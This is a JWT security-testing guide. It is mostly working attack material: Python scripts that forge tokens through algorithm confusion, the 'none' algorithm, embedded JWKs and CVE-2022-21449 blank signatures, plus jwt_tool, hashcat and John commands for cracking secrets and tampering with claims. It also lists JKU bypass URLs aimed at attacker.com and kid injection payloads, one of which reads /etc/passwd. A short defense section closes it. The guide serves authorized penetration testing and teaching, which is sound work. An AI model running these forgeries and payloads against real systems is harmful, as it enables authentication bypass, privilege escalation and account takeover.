# JWT (JSON Web Token) Vulnerabilities

## Overview

JSON Web Tokens (JWTs) are widely used for authentication and authorization. This document covers comprehensive attack vectors, exploitation techniques, and practical tools for JWT security testing.

## 1. Signature Attacks

### 1.1 Algorithm Confusion (RS256 to HS256)

**Vulnerability**: When a server uses RS256 (asymmetric) but accepts HS256 (symmetric), an attacker can sign tokens using the public key as the HMAC secret.

**Attack Flow**:
1. Obtain the server's public RSA key (often available at `/jwks.json`, `/.well-known/jwks.json`)
2. Change the `alg` header from RS256 to HS256
3. Sign the modified token using the public key as the HMAC secret

**Exploitation with jwt_tool**:
```bash
# Basic algorithm confusion attack
jwt_tool <JWT> -X k -pk public_key.pem

# Specify output format
jwt_tool <JWT> -X k -pk public_key.pem -I -pc "admin" -pv "true"

# Using downloaded JWKS
jwt_tool <JWT> -X k -ju https://target.com/.well-known/jwks.json
```

**Manual Python Exploitation**:
```python
import jwt
import json

# Original token signed with RS256
original_token = "eyJ..."

# Decode without verification to get payload
payload = jwt.decode(original_token, options={"verify_signature": False})

# Read public key
with open('public_key.pem', 'r') as f:
    public_key = f.read()

# Sign with HS256 using public key as secret
forged_token = jwt.encode(payload, public_key, algorithm='HS256')
print(forged_token)
```

**Burp Suite JWT Editor**:
1. Install "JWT Editor" extension
2. Capture request with JWT
3. Send to Repeater
4. Click "JSON Web Token" tab
5. Modify header: change `"alg": "RS256"` to `"alg": "HS256"`
6. Use "Attack" -> "Embedded JWK" or sign with key

### 1.2 None Algorithm Attack

**Vulnerability**: Server accepts tokens with `"alg": "none"`, bypassing signature verification entirely.

**Attack Variations**:
```
"alg": "none"
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

**Exploitation with jwt_tool**:
```bash
# None algorithm attack
jwt_tool <JWT> -X a

# With payload modification
jwt_tool <JWT> -X a -I -pc "role" -pv "admin"

# Try all none variations
jwt_tool <JWT> -X a -I -pc "sub" -pv "admin@target.com"
```

**Manual Exploitation**:
```python
import base64
import json

def create_none_token(payload):
    header = {"alg": "none", "typ": "JWT"}

    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')

    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')

    # Empty signature
    return f"{header_b64}.{payload_b64}."

# Create forged token
forged = create_none_token({"sub": "admin", "role": "superuser"})
```

### 1.3 Key Confusion Attacks

**Vulnerability**: Confusion between different key types or key material sources.

**Attack Scenarios**:
- Using public key where private key expected
- Symmetric vs asymmetric key confusion
- Key ID pointing to wrong key material

**jwt_tool Key Confusion**:
```bash
# Test key confusion
jwt_tool <JWT> -X s -pk symmetric_key.txt

# HMAC with RSA public key
jwt_tool <JWT> -X k -pk rsa_public.pem
```

### 1.4 Weak Key Attacks

**Vulnerability**: JWT signed with weak, predictable, or default secrets.

**Common Weak Secrets**:
```
secret
password
123456
jwt_secret
your-256-bit-secret
changeme
supersecret
```

**Brute Force with jwt_tool**:
```bash
# Dictionary attack
jwt_tool <JWT> -C -d /usr/share/wordlists/rockyou.txt

# With threading
jwt_tool <JWT> -C -d wordlist.txt -t 100

# Quick common secrets check
jwt_tool <JWT> -C -d jwt-common-secrets.txt
```

**Hashcat JWT Cracking**:
```bash
# Extract hash format
echo "<JWT>" > jwt.txt
python3 jwt2hashcat.py jwt.txt > hash.txt

# Crack with hashcat (mode 16500)
hashcat -m 16500 hash.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 16500 hash.txt wordlist.txt -r best64.rule
```

**John the Ripper**:
```bash
# Direct JWT cracking
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

### 1.5 JKU (JWK Set URL) Header Injection

**Vulnerability**: Attacker controls the URL where the server fetches the signing key.

**Attack Flow**:
1. Generate attacker's key pair
2. Host malicious JWKS at attacker-controlled URL
3. Modify JWT header to point to attacker's JWKS
4. Sign token with attacker's private key

**Exploitation with jwt_tool**:
```bash
# JKU injection attack
jwt_tool <JWT> -X s -ju https://attacker.com/jwks.json

# With custom key
jwt_tool <JWT> -X s -ju https://attacker.com/jwks.json -pr private_key.pem
```

**Manual JWKS Setup**:
```python
from jwcrypto import jwk, jwt
import json

# Generate key pair
key = jwk.JWK.generate(kty='RSA', size=2048, kid='attacker-key')

# Create JWKS for hosting
jwks = {"keys": [json.loads(key.export_public())]}
print(json.dumps(jwks, indent=2))

# Save to file and host on attacker server
with open('jwks.json', 'w') as f:
    json.dump(jwks, f)
```

**Bypass Techniques for JKU Validation**:
```
# URL manipulation
jku: https://attacker.com#@trusted.com/jwks.json
jku: https://trusted.com@attacker.com/jwks.json
jku: https://trusted.com.attacker.com/jwks.json
jku: https://attacker.com/trusted.com/jwks.json
jku: https://trusted.com%00.attacker.com/jwks.json

# Open redirect exploitation
jku: https://trusted.com/redirect?url=https://attacker.com/jwks.json
```

### 1.6 X5U (X.509 URL) Header Injection

**Vulnerability**: Similar to JKU but using X.509 certificate URL.

**Exploitation**:
```bash
# Generate self-signed certificate
openssl req -x509 -nodes -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

# Convert to DER format for hosting
openssl x509 -in cert.pem -outform DER -out cert.der

# jwt_tool x5u injection
jwt_tool <JWT> -X s -x5u https://attacker.com/cert.pem -pr key.pem
```

### 1.7 Kid (Key ID) Injection

**Vulnerability**: The `kid` parameter is used unsafely, allowing path traversal, SQL injection, or command injection.

**Path Traversal**:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"
}
```
Sign with empty string as key.

**SQL Injection**:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1' UNION SELECT 'attacker-secret'--"
}
```

**Command Injection**:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key1|cat /etc/passwd"
}
```

**jwt_tool Kid Injection**:
```bash
# Path traversal via kid
jwt_tool <JWT> -X i -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# SQL injection
jwt_tool <JWT> -X i -I -hc kid -hv "' UNION SELECT 'secret'--"
```

---

## 2. Claim Manipulation Attacks

### 2.1 Expiration (exp) Bypass

**Vulnerability**: Token expiration not properly validated.

**Attack Techniques**:
```python
# Remove exp claim
payload = {"sub": "user", "role": "admin"}  # No exp

# Set far future expiration
payload = {"sub": "user", "exp": 9999999999}

# Set negative or zero expiration
payload = {"sub": "user", "exp": 0}

# Epoch confusion
payload = {"sub": "user", "exp": "never"}
```

**jwt_tool Manipulation**:
```bash
# Modify expiration
jwt_tool <JWT> -I -pc exp -pv 9999999999

# Remove expiration
jwt_tool <JWT> -I -pd exp

# Tamper claim and resign
jwt_tool <JWT> -T -S hs256 -p "secret" -pc exp -pv 9999999999
```

### 2.2 Not Before (nbf) Bypass

**Vulnerability**: nbf claim not validated or improperly handled.

```bash
# Set nbf to past
jwt_tool <JWT> -I -pc nbf -pv 0

# Remove nbf
jwt_tool <JWT> -I -pd nbf
```

### 2.3 Issuer (iss) Manipulation

**Vulnerability**: Issuer claim not validated against whitelist.

```bash
# Change issuer
jwt_tool <JWT> -I -pc iss -pv "https://attacker-idp.com"

# Test accepted issuers
jwt_tool <JWT> -I -pc iss -pv "http://localhost"
jwt_tool <JWT> -I -pc iss -pv "https://dev.target.com"
```

### 2.4 Audience (aud) Manipulation

**Vulnerability**: Audience restriction not enforced.

```bash
# Change audience
jwt_tool <JWT> -I -pc aud -pv "admin-api"
jwt_tool <JWT> -I -pc aud -pv ["api1", "api2"]
```

### 2.5 Subject (sub) Manipulation

**Vulnerability**: Subject claim trusted without validation.

```bash
# Privilege escalation via sub
jwt_tool <JWT> -I -pc sub -pv "admin"
jwt_tool <JWT> -I -pc sub -pv "user_id:1"  # First user often admin
```

### 2.6 Role/Privilege Tampering

**Vulnerability**: Authorization claims not cryptographically protected or validated.

**Common Claim Targets**:
```bash
# Role escalation
jwt_tool <JWT> -I -pc role -pv "admin"
jwt_tool <JWT> -I -pc roles -pv '["admin","superuser"]'
jwt_tool <JWT> -I -pc is_admin -pv true
jwt_tool <JWT> -I -pc permissions -pv '["read","write","delete","admin"]'
jwt_tool <JWT> -I -pc groups -pv '["administrators"]'
jwt_tool <JWT> -I -pc scope -pv "admin:full"
```

---

## 3. Implementation Flaws

### 3.1 Missing Signature Verification

**Vulnerability**: Server decodes JWT payload without verifying signature.

**Detection**:
1. Modify any claim in the payload
2. Keep original signature
3. If accepted, signature verification is missing

**Testing**:
```bash
# Tamper without resigning
jwt_tool <JWT> -I -pc role -pv "admin"
# Use -I flag to inject/modify claims without signature update
```

### 3.2 Signature Stripping

**Vulnerability**: Server accepts unsigned tokens.

**Attack**:
```python
# Original: header.payload.signature
# Stripped: header.payload.
# Or:       header.payload

token_parts = original_jwt.split('.')
stripped_token = f"{token_parts[0]}.{token_parts[1]}."
```

### 3.3 Token Replay Attacks

**Vulnerability**: Valid tokens accepted indefinitely without tracking.

**Attack Scenarios**:
- Captured token reused after user logs out
- Expired session token still accepted
- No jti (JWT ID) claim for uniqueness

**Testing**:
1. Capture valid JWT
2. Logout from application
3. Replay captured token
4. Check if still accepted

### 3.4 Sensitive Data in Payload

**Vulnerability**: JWT payload contains sensitive information.

**Information Disclosure**:
```python
import base64
import json

def decode_jwt_payload(token):
    payload_b64 = token.split('.')[1]
    # Add padding
    payload_b64 += '=' * (4 - len(payload_b64) % 4)
    payload = base64.urlsafe_b64decode(payload_b64)
    return json.loads(payload)

# Check for sensitive data
payload = decode_jwt_payload(token)
sensitive_keys = ['password', 'ssn', 'credit_card', 'api_key', 'secret']
for key in payload:
    if any(s in key.lower() for s in sensitive_keys):
        print(f"Sensitive data found: {key}")
```

---

## 4. Advanced JWT Attacks

### 4.1 CVE-2022-21449 - Java ECDSA Psychic Signatures

**Vulnerability**: Java versions 15-18 had a bug in ECDSA signature verification allowing blank signatures.

**Affected Versions**:
- Java 15.0.0 to 15.0.6
- Java 16.0.0 to 16.0.4
- Java 17.0.0 to 17.0.2
- Java 18.0.0

**Exploitation**:
```python
import base64

def create_blank_signature_jwt(header, payload):
    """
    Create JWT with blank ECDSA signature for CVE-2022-21449
    """
    header_b64 = base64.urlsafe_b64encode(header.encode()).decode().rstrip('=')
    payload_b64 = base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')

    # Blank signature (r=0, s=0)
    # For ES256, signature should be 64 bytes (32 for r, 32 for s)
    blank_sig = base64.urlsafe_b64encode(b'\x00' * 64).decode().rstrip('=')

    return f"{header_b64}.{payload_b64}.{blank_sig}"

header = '{"alg":"ES256","typ":"JWT"}'
payload = '{"sub":"admin","role":"superuser"}'
forged_jwt = create_blank_signature_jwt(header, payload)
```

**jwt_tool Testing**:
```bash
# Test blank signature
jwt_tool <JWT> -X b
```

### 4.2 JWK Set Injection (Embedded JWK)

**Vulnerability**: Server trusts embedded JWK in token header for verification.

**Attack Flow**:
1. Generate new key pair
2. Embed public key in JWT header
3. Sign with corresponding private key

**Burp JWT Editor**:
1. Capture JWT request
2. Send to Repeater
3. Go to "JSON Web Token" tab
4. Click "Attack" -> "Embedded JWK"
5. Token auto-signed with embedded key

**jwt_tool**:
```bash
# Embedded JWK attack
jwt_tool <JWT> -X e

# With custom payload
jwt_tool <JWT> -X e -I -pc role -pv "admin"
```

**Manual Exploitation**:
```python
from jwcrypto import jwk, jwt
import json

# Generate new key
key = jwk.JWK.generate(kty='RSA', size=2048)

# Create token with embedded JWK
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": json.loads(key.export_public())
}

payload = {"sub": "admin", "role": "superuser"}

token = jwt.JWT(header=header, claims=payload)
token.make_signed_token(key)
print(token.serialize())
```

### 4.3 Cross-Service Token Relay

**Vulnerability**: JWT accepted across multiple services sharing same key or trust.

**Attack Scenario**:
1. Obtain JWT from Service A (low-privilege)
2. Use same JWT against Service B (higher-privilege)
3. Exploit shared secret or trust relationship

**Testing**:
```bash
# Test token against different endpoints
for endpoint in /api/v1 /api/v2 /admin/api /internal/api; do
    curl -H "Authorization: Bearer $JWT" https://target.com$endpoint/whoami
done
```

### 4.4 Token Confusion Attacks

**Vulnerability**: ID tokens used as access tokens or vice versa.

**Attack**:
1. Obtain ID token (meant for client verification)
2. Use as access token (meant for API authorization)
3. Bypass intended access controls

**Testing**:
```bash
# Use ID token as access token
curl -H "Authorization: Bearer $ID_TOKEN" https://api.target.com/protected

# Use access token as ID token
curl -H "Authorization: Bearer $ACCESS_TOKEN" https://target.com/userinfo
```

---

## 5. Tool Reference

### 5.1 jwt_tool Complete Commands

```bash
# Installation
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt

# Basic usage
jwt_tool <JWT>                           # Decode and analyze
jwt_tool <JWT> -T                        # Tamper mode
jwt_tool <JWT> -C -d wordlist.txt        # Crack secret
jwt_tool <JWT> -X a                      # None algorithm
jwt_tool <JWT> -X k -pk public.pem       # Key confusion
jwt_tool <JWT> -X e                      # Embedded JWK
jwt_tool <JWT> -X s                      # Sign with key
jwt_tool <JWT> -X i                      # Inject claims

# Claim modification
jwt_tool <JWT> -I -pc <claim> -pv <value>  # Inject/modify payload claim
jwt_tool <JWT> -I -hc <claim> -hv <value>  # Inject/modify header claim
jwt_tool <JWT> -I -pd <claim>              # Delete payload claim
jwt_tool <JWT> -I -hd <claim>              # Delete header claim

# Signing
jwt_tool <JWT> -S hs256 -p "secret"        # Sign with HMAC
jwt_tool <JWT> -S rs256 -pr private.pem    # Sign with RSA

# Automated scanning
jwt_tool <JWT> -M at                       # All tests
jwt_tool <JWT> -M pb                       # Playbook mode
```

### 5.2 Burp Suite JWT Editor

**Installation**:
1. Burp Suite -> Extender -> BApp Store
2. Search "JWT Editor"
3. Install

**Features**:
- Automatic JWT detection and decoding
- Key generation (RSA, EC, OKP)
- Signature attacks (embedded JWK, JKU, etc.)
- Claim tampering interface

**Usage**:
1. Capture request with JWT
2. Send to Repeater
3. Click "JSON Web Token" tab
4. Edit header/payload claims
5. Use Attack menu for automated attacks
6. Click "Sign" to resign with selected key

### 5.3 Python JWT Libraries for Testing

```python
# PyJWT
import jwt

# Decode without verification (DANGEROUS - testing only)
payload = jwt.decode(token, options={"verify_signature": False})

# Encode with custom algorithm
token = jwt.encode(payload, key, algorithm="HS256")

# python-jose
from jose import jwt

# Decode
payload = jwt.decode(token, key, algorithms=['RS256'])

# jwcrypto
from jwcrypto import jwt, jwk

# Full control over token construction
token = jwt.JWT(header={"alg": "RS256"}, claims=payload)
```

---

## 6. Defense Recommendations

### 6.1 Secure Configuration

```python
# Always specify allowed algorithms
jwt.decode(token, key, algorithms=['RS256'])  # Explicit algorithm

# Never use none algorithm
ALLOWED_ALGORITHMS = ['RS256', 'ES256']  # No 'none'

# Validate all claims
jwt.decode(
    token,
    key,
    algorithms=['RS256'],
    audience='expected-audience',
    issuer='expected-issuer',
    options={
        'require': ['exp', 'iat', 'iss', 'aud', 'sub'],
        'verify_exp': True,
        'verify_iat': True,
        'verify_iss': True,
        'verify_aud': True
    }
)
```

### 6.2 Key Management

- Use strong, random secrets (256+ bits for HMAC)
- Rotate keys regularly
- Store keys securely (HSM, vault)
- Never embed keys in code or JWTs
- Validate jku/x5u against strict whitelist

### 6.3 Token Hygiene

- Short expiration times (15 minutes for access tokens)
- Use refresh tokens for long sessions
- Implement token revocation (jti blacklist)
- Never store sensitive data in payload
- Use different keys for different token types

---

## 7. Cheat Sheet

| Attack | jwt_tool Flag | Burp JWT Editor |
|--------|--------------|-----------------|
| None Algorithm | `-X a` | Manual header edit |
| Algorithm Confusion | `-X k -pk key.pem` | Attack menu |
| Embedded JWK | `-X e` | Attack -> Embedded JWK |
| JKU Injection | `-X s -ju URL` | Manual + sign |
| Weak Key Crack | `-C -d wordlist` | N/A (use hashcat) |
| Claim Tampering | `-I -pc claim -pv value` | Edit in GUI |
| Kid Injection | `-I -hc kid -hv payload` | Manual header edit |
| Blank Signature | `-X b` | Manual signature edit |

---

## References

- RFC 7519 - JSON Web Token (JWT)
- RFC 7515 - JSON Web Signature (JWS)
- RFC 7517 - JSON Web Key (JWK)
- OWASP JWT Security Cheat Sheet
- PortSwigger Web Security Academy - JWT Attacks
- jwt_tool GitHub Repository
- CVE-2022-21449 - Java ECDSA Vulnerability
